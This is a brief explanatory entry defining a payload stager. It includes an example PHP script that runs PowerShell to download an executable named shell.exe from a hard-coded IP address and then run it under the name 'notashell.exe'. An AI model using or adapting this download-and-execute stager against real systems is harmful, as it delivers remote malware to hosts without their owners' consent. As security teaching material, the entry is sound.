payload stager: A stager is a small program, usually hand-optimized assembly, that downloads a payload stage, injects it into memory, and passes execution to it.
This process is known as staging. A payload stager, in the context of computer security and hacking, refers to a small piece of code or script used to deliver and execute a more substantial malicious payload on a target system.
It's often a two-stage or multi-stage approach to malware delivery and execution. 

Ex)

<?php
  function get_stager() {
    $init = "powershell.exe";
    $payload = "Invoke-WebRequest 10.50.104.7:8000/shell.exe -outfile notashell.exe"; // Insert PowerShell payload here
    $execution_command = "shell_exec";
    $query = $execution_command("$init $payload");
    echo $query; // Execute query
  }
  function execute_stager() {
    $init = "powershell.exe";
    $payload = ".\notashell.exe"; // Insert PowerShell payload here
    $execution_command = "shell_exec";
    $query = $execution_command("$init $payload");
    echo $query; // Execute query
  }
  get_stager();
  execute_stager();
  die();
?>
